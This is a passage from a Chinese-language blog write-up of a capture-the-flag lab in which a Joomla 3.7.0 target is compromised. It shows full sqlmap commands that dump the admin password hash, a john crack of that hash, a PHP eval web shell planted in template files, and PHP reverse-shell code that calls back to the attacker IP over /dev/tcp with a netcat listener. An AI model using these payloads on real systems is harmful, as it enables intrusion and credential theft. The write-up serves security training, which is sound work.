src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110758621.png" alt="image-20240702110758621"></p><p>扫描结果列举了可能存在csrf漏洞的目录：</p><blockquote><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;reset.request&amp;Itemid&#x3D;101</p></blockquote><table><thead><tr><th align="left">csrf漏洞：CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</th></tr></thead></table><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><h3 id="访问目标靶机"><a href="#访问目标靶机" class="headerlink" title="访问目标靶机"></a>访问目标靶机</h3><p>在浏览器访问目标靶机的IP地址<code>192.168.204.132</code></p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702104858844.png" alt="image-20240702104858844"></p><p>其中的提示信息为：</p><blockquote><p>This time, there is only one flag, one entry point and no clues.</p><p>To get the flag, you’ll obviously have to gain root privileges.</p><p>How you get to be root is up to you - and, obviously, the system.</p><p>Good luck - and I hope you enjoy this little challenge.</p><p>这次只有一个flag，一个入口并且没有提示。为了获取flag，你需要获得root权限。如何获得root权限取决于你自己，当然，也取决于系统。祝你好运，我希望你能享受这个挑战。</p></blockquote><h3 id="指纹工具识别技术构成"><a href="#指纹工具识别技术构成" class="headerlink" title="指纹工具识别技术构成"></a>指纹工具识别技术构成</h3><p>使用浏览器插件<code>Wappalyzer</code>进行指纹识别，进行网页技术构成识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702113249330.png" alt="image-20240702113249330"></p><p>可以看到，这个网页使用的是<strong>Joomla CMS</strong>框架，Joomia在前面进行nmap漏扫的时候也出现过捏！使用的编程语言是<strong>PHP</strong>，操作系统是<strong>Ubuntu</strong>。</p><h2 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702184616071.png" alt="image-20240702184616071"></p><p>得到的目录信息：</p><blockquote><p> <a href="http://192.168.204.132/media/">http://192.168.204.132/media/</a></p><p> <a href="http://192.168.204.132/templates/">http://192.168.204.132/templates/</a></p><p> <a href="http://192.168.204.132/modules/">http://192.168.204.132/modules/</a></p><p> <a href="http://192.168.204.132/images/">http://192.168.204.132/images/</a></p><p> <a href="http://192.168.204.132/bin/">http://192.168.204.132/bin/</a></p><p> <a href="http://192.168.204.132/plugins/">http://192.168.204.132/plugins/</a></p><p> <a href="http://192.168.204.132/includes/">http://192.168.204.132/includes/</a></p><p> <a href="http://192.168.204.132/language/">http://192.168.204.132/language/</a></p><p> <a href="http://192.168.204.132/components/">http://192.168.204.132/components/</a></p><p> <a href="http://192.168.204.132/cache/">http://192.168.204.132/cache/</a></p><p> <a href="http://192.168.204.132/libraries/">http://192.168.204.132/libraries/</a></p><p> <a href="http://192.168.204.132/tmp/">http://192.168.204.132/tmp/</a></p><p> <a href="http://192.168.204.132/layouts/">http://192.168.204.132/layouts/</a></p><p> <a href="http://192.168.204.132/administrator/">http://192.168.204.132/administrator/</a></p><p> <a href="http://192.168.204.132/cli/">http://192.168.204.132/cli/</a></p></blockquote><p>发现了管理员目录，即后台管理系统 <code>http://192.168.204.132/administrator/</code>欸！！</p><p>试着在网页进行访问：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702185113830.png" alt="image-20240702185113830"></p><p>接下来的思路是寻找可通过认证的用户账号，即用户名和密码。</p><h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>使用<code>searchsploit</code>进行漏洞搜索。</p><p>- </p><p>在前面两个靶场中，我们都是使用kali自带的msfconsole来进行漏洞查询，那为什么在这个靶场就要使用searchsploit了呢？searchsploit和msfconsole有什么区别？</p><blockquote><ul><li><p>searchsploit</p><p>功能：用于搜索漏洞利用代码，是一个命令行工具。</p><p>用途：主要用于查找已知漏洞的利用代码。</p></li><li><p>msfconsole</p><p>功能：是metasploit框架的命令行接口，包含了大量的漏洞利用模块。</p><p>用途：主要用于执行漏洞渗透测试活动，包括选择合适的漏洞利用模块，设置payload，执行渗透攻击，获取远程访问权限等。</p></li></ul></blockquote><p>- </p><p>前面 nmap漏扫 以及 后面的 gubuster目录爆破的后台管理界面 已经提示得不能再明显了，是Joomla！所以此处我们直接针对这个漏洞使用searchsploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p>找到非常多该漏洞的可利用代码文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191749731.png" alt="image-20240702191749731"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191823709.png" alt="image-20240702191823709"></p><p>根据前面进行nmap漏扫得到的结果显示，目标靶机使用的Joomla版本为3.7.0。因此，我们可以进行更详细的searchsploit搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p>得到的结果很精炼，可以利用SQL注入以及CSS攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702192127253.png" alt="image-20240702192127253"></p><p>查看其详细信息：</p><p>如何查看<code>php/webapps/42033.txt</code>以及<code>php/webapps/43488.txt</code>代码文件？</p><p>答：使用searchsploit。使用<code>searchsploit -p 42033/43488.txt </code> 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 42033.txt<br>searchsploit -p 43488.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193128571.png" alt="image-20240702193128571"></p><p>在详细信息中，可利用代码文件的路径path被展示出来。</p><ul><li>SQL注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>  /usr/share/exploitdb/exploits/php/webapps/42033.txt   <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193539768.png" alt="image-20240702193539768"></p><p>可以从中得到该SQL注入漏洞利用的使用方法，利用sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><ul><li>CSS攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/43488.txt  <br></code></pre></td></tr></table></figure><blockquote><p>CSS攻击是一种利用浏览器对CSS的解析和应用来实施的安全攻击。通过利用浏览器在渲染网页时对CSS的强大控制能力，通过构造恶意的CSS代码来实现攻击的目的。常见的CSS攻击方式有：CSS注入攻击、CSS选择器攻击、CSS历史攻击、针对特定浏览器漏洞的攻击等等。</p></blockquote><p>有关于该漏洞利用的概要介绍为:</p><blockquote><ol><li>Description（描述）</li></ol><p>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed in the user’s browser. Works with every version up to 4.0.20</p><p>无论何时用户在正文中使用&lt;\textarea&gt;编辑信息时，&lt;\textarea&gt;时候的任意内容都会在用户的浏览器中被执行。这一特性适用于4.0.20之前的版本。</p><ol start="2"><li>Proof of Concept（概念验证）</li></ol><p>Login with permissions to post a message, insert &lt;\textarea&gt; in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed</p><p>获取相应权限登陆以发布信息，在主体中插入 &lt;\textarea&gt; 并在它后面添加任意html代码，无论何时用户尝试去编辑这些信息，那些被写在 &lt;\textarea&gt; 后面的代码都会被执行。</p><ol start="3"><li>Solution:（解决方案）</li></ol><p>Update to version 4.0.21<br><a href="https://stackideas.com/blog/easydiscuss4021-update">https://stackideas.com/blog/easydiscuss4021-update</a></p><p>将版本更新到4.0.21</p></blockquote><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>意思意思吧，万一有比SQL注入更简便的方法呢？或许直接有用户的数据库呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702200337335.png" alt="image-20240702200337335"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202047792.png" alt="image-20240702202047792"></p><p>可以看到，有关于Joomla的漏洞还挺多！</p><p>在前面的nmap漏扫，以及上面的searchsploit（附带版本号）的查询结果，都提到了SQL注入。</p><p>在上述msfconsole的搜索结果中，在rank等级为<code>excellent</code>，又比较新的漏洞中查找有关于SQL注入的漏洞，并尝试利用它：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202404808.png" alt="image-20240702202404808"></p><p>好！6号漏洞<code>exploit/unix/webapp/joomla_comfields_sqli_rce </code>申请出战！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/joomla_comfields_sqli_rce<br><br>show options<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.132<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202620785.png" alt="image-20240702202620785"></p><p>执行<code>run/exploit</code>:<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202723977.png" alt="image-20240702202723977"></p><p>发现均没有 session 被创建，即利用失败！对<code>msfconsole</code>搜索出来的漏洞利用失败，所以我们还是得回去尝试通过<code>searchsploit</code>搜索得到的可利用代码文件以及利用方法了。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>根据上一节<code>searchsploit</code>搜索得到的信息对目标靶机进行sqlmap注入测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>--dbs</code>：指示 sqlmap 列出目标数据库服务器中的所有数据库</p><p>注入结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702203426962.png" alt="image-20240702203426962"></p><p>失败了。。。。。？？？？</p><p>哦！注意！利用文件中给出的利用方法中，给出的URL中的<code>localhost</code>字段需要自己手动修改成目标靶机的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702204349894.png" alt="image-20240702204349894"></p><p>得到的信息有：</p><blockquote><p>可用的数据库有：</p><p>information_schema<br><strong>joomladb</strong>    <strong>！！！！</strong><br>mysql<br>performance_schema<br>sys</p></blockquote><p>对其中最可能含有有价值信息的joomladb数据库进行进一步的访问，指定列出joomladb数据库的所有表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明目标URL</p><p><code>-D</code>：指定目标数据库的名称</p><p><code>--riks</code>：设置SQL注入的风险级别，数字越高表示尝试更高风险的注入测试。</p><p><code>--level</code>：设置测试的深度级别，数字越高表示尝试更深入的注入测试。</p><p><code>--random-agent</code>该参数使得每次请求都使用一个随机的User-Agent头部，这有助于隐藏 sqlmap 的请求特征，增加匿名性。</p><p><code>--tables</code>：参数指示sqlmap列出目标数据库中的所有表名。</p><p><code>-P list[fullordering]</code>：-p参数指定了用于注入的URL参数名：list[fullordering]这是一个潜在的注入点，sqlmap将尝试利用这个参数进行SQL注入测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235531424.png" alt="image-20240702235531424"></p><p>一共有76张表table呢！在其中发现了一个名为<code>users</code>的表，尝试访问。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235648824.png" alt="image-20240702235648824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-T</code>：用于指定目标数据库中的表名。因为数据库名是<code>#__users</code>，但是<code>#</code>在数据库中又表示注释符号，所以需要给给这个字段添加一对双引号，以防止错误解析。</p><p><code>--columns</code>：该参数指示sqlmap列出指定表的所有列。</p><p>在实际的命令运行过程中，会发生有三个需要输入选项的地方，前两个选<code>y</code>之后那个需要选择字典wordlist的地方就什么都不选直接 回车等待结果就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150454303.png" alt="image-20240703150454303"></p><p>得到<code>joomladb数据库</code>的表为<code> #__users</code>的<code>列</code>相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150540777.png" alt="image-20240703150540777"></p><p>可以发现其中有名为<code> name 、password、 username</code>的账户信息列。因而我们需要进一步查看这些列的具体信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> -C name,username,password --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-C </code>：指定要查询的列名，多个列名之间使用逗号进行分隔。</p><p><code>--dump</code>该参数指示sqlmap将从数据库中检索到的数据打印出来。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703151043560.png" alt="image-20240703151043560"></p><p>不难想到这是一个管理员的账号，但是密码显然是经过hash加密后的。因此接下来就是要对这个密码进行碰撞破解或是进行重置，将其修改为自己的密码。</p><blockquote><p>name:admin</p><p>username：admin</p><p>password：</p><p>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p></blockquote><ul><li>重置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152729545.png" alt="image-20240703152729545"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152857235.png" alt="image-20240703152857235"></p><blockquote><p>.so文件是linux系统中的动态链接库文件，它们通过动态链接的方式在运行时被程序加载。</p></blockquote><p>看了有关于带有<code>hash</code>字样文件的搜索结果，发现其中并没有关于password-hash的加密脚本文件。虽然有几个像的，但是也没有明确显示出就是hash密码加密脚本文件。所以重置密码这个思路可以暂时搁置了。</p><ul><li>碰撞爆破</li></ul><p>使用<code>john</code>工具来实现hash值的碰撞爆破。（kali自带有john）</p><p>首先先将上述获得的管理员密码的hash值保存为<code>user_password_hash.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> user_password_hash.txt<br><br>vim user_password_hash.txt<br><br><span class="hljs-built_in">cat</span> user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154132239.png" alt="image-20240703154132239"></p><p>然后使用john命令进行碰撞爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154228849.png" alt="image-20240703154228849"></p><p>中间标黄的就是碰撞爆破得到的密码：<code>snoopy </code></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>ok！尝试去登陆后台管理系统<code>http://192.168.204.132/administrator/</code>！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154538725.png" alt="image-20240703154538725"></p><p>成功！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>到处看看管理系统，发现在Extensions下的Templates（模板）有Templates模板块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154807462.png" alt="image-20240703154807462"></p><p>进入该模板块，发现其中一共有两个模板：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154823270.png" alt="image-20240703154823270"></p><p>点进第一个模板，在左侧目录栏进入<code>index.php</code>文件（正常情况下优先考虑的文件）。</p><blockquote><p>有了PHP文件，就可以考虑各种拿shell的方法，包括但不限于一句话木马。</p><ul><li>一句话木马</li></ul><?php @eval($_POST['shell']);?><p>以 <?php 和 ;?> 分别为开头和结尾，然后使用 @ 符号抑制错误输出，后面接着跟着 一个函数名 用于 执行字符串 作为php代码运行。接着跟一个括号，括号内首先跟一个超全局数组 $_POST ，这里表示获取通过POST方法传递的参数，后面接着一个中括号，括号内为向POST传递的一个（命令）字符串，该（命令）字符串将会被前面的函数执行，就是相当于执行某个命令嘛！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703160840412.png" alt="image-20240703160840412"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703162717989.png" alt="image-20240703162717989"></p><p>在此处设置放入一句话木马🐎（放在最开始吧）：</p><p>注意！这里去头去尾了哦！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703232034778.png" alt="image-20240703232034778"></p><p>点击左上角的“save &amp; close”对文件进行保存。</p><p>对第二个模板进行相同的一句话木马注入操作，以防止上面所注入一句话木马的模板并不是目标靶机后台管理系统所使用的模板，进而导致失败瓶颈。</p><p>然后通过中国蚁剑进行连接。</p><blockquote><p>kali安装中国蚁剑的教程为：</p><p><a href="https://blog.csdn.net/liver100day/article/details/120222378%EF%BC%88kali%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91%EF%BC%89">https://blog.csdn.net/liver100day/article/details/120222378（kali如何安装蚁剑）</a></p></blockquote><p>安装完kali之后，若想在本地物理主机远程连接以及打开中国蚁剑，那么需要启用X11转发选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -X sweet@192.168.204.128<br></code></pre></td></tr></table></figure><p>连接成功后进入到中国蚁剑文件夹中，执行<code>./AntSword</code>命令：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211405701.png" alt="image-20240703211405701"></p><p>发现在本地物理主机上启动失败。粗错误信息表示应用程序在试图连接到X服务器的显示屏，但无法打开显示。根据gpt问答，可知需要启用X11转发选项，但是我已经启用了，还是没能成功显示。</p><p>当然也有可能是DISPLAY环境变量没正确设置，但是再次尝试有点花费时间和力气。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211719844.png" alt="image-20240703211719844"></p><p>去kali虚拟机上尝试启用中国蚁剑（在kali已经成功安装的基础上）。成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211900066.png" alt="image-20240703211900066"></p><p>右键空白处选择“ADD”添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213434075.png" alt="image-20240703213434075"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213808540.png" alt="image-20240703213808540"></p><p><code>Shell url</code>:目标靶机的URL地址。</p><p><code>Shell pwd</code>：连接密码，代码参数值，例如 &lt;?php @eval($_POST[‘x’])?;&gt;中的“X”值。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213828518.png" alt="image-20240703213828518"></p><p>选中所添加的连接，右键选择第一项<code>Ternimal</code>打开终端。如果能正确连接上目标靶机URL的话就会显示如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234428385.png" alt="image-20240703234428385"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>中国蚁剑连接上目标URL之后，模拟的是正常用户访问该URL，只要访问该URL，网页代码就会被启动，一句话木马就会被触发。我们注入的一句话木马要执行的命令是<code>shell</code>提权命令。所以使用上述检测命令检测当前所获得的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234524751.png" alt="image-20240703234524751"></p><p>根据结果可以发现，尽管已经拿到了shell，但是目前所拥有的权限还不是root权限。因此，还需要进行进一步的提权操作。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linux提权总结：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>编写通过prop_open反弹shell的php代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。<br>&lt;?php<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;  // 攻击者的IP地址<br><span class="hljs-variable">$port</span> = 9999;          // 攻击者的端口号<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>    0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   // stdin 是一个管道，子进程从中读取数据<br>    1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   // stdout 是一个管道，子进程向其中写入数据<br>    2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    // stderr 是一个管道，子进程向其中写入数据<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>    fclose(<span class="hljs-variable">$pipes</span>[0]);  // 关闭stdin<br>    fclose(<span class="hljs-variable">$pipes</span>[1]);  // 关闭stdout<br>    fclose(<span class="hljs-variable">$pipes</span>[2]);  // 关闭stderr<br><br>    proc_close(<span class="hljs-variable">$process</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>将这段php代码（掐头去尾）分别加入到两个模板文件中的index.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004311523.png" alt="image-20240704004311523"></p><p>在终端监听设置的端口 <code>9999</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>：netstat，用于监听指定端口，可用于读取或写入网络连接的数据。</p><p><code>-l</code>：监听模式，指示其在指定的端口上监听连接请求。</p><p><code>-v</code>：详细模式</p><p><code>-vv</code>：更详细的详细模式</p><p><code>-p</code>：指定监听的端口号</p><p>然后访问目标网页URL<code>http://192.168.204.132/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004700989.png" alt="image-20240704004700989"></p><p>反弹成功，成功获取<code>www-data</code>的权限，伪装成为用户www-data。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005119035.png" alt="image-20240704005119035"></p><h3 id="检索提权命令"><a href="#检索提权命令" class="headerlink" title="检索提权命令"></a>检索提权命令</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br><br>//查看并过滤与模式列表的模式整行匹配的命令<br>compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br></code></pre></td></tr></table></figure><p><code>-E</code>：表示使用扩展正则表达式进行匹配。</p><p><code>-x</code>：只匹配整行，即完全匹配 模式 中的整行内容，例nmap。即不断章取义的意思</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005209848.png" alt="image-20240704005209848"></p><h4 id="查看具有SUID权限的命令"><a href="#查看具有SUID权限的命令" class="headerlink" title="查看具有SUID权限的命令"></a>查看具有SUID权限的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img 